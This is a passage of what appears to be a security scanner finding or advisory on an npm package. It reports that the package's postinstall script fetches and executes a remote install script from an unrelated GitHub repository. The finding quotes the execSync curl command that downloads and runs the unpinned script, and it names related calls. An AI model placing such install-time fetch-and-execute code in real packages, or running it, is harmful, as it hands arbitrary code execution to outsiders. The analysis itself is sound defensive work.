  "summary": "Postinstall dependency-manager fetches and executes remote install script from third-party GitHub repository",
  "details": "The package ships scripts/dependency-manager.js which, at install time, invokes execSync('curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/refs/heads/master/install.sh...') to fetch and execute a shell script from a mutable master branch of an unrelated third-party repository (rtk-ai/rtk). The fetched content is unpinned (tracks the latest commit on master), unverified (no hash or signature check), and controlled by an external GitHub account whose ownership does not match the npm publisher scope (@leejungkiin). The same file also contacts https://www.rtk-ai.app, uses child_process together with os.homedir() and process.platform, and reads local filesystem state via fs.readFileSync/existsSync. This drop-and-execute pattern grants whoever controls the rtk-ai/rtk repository arbitrary code execution on any machine that installs this package.",
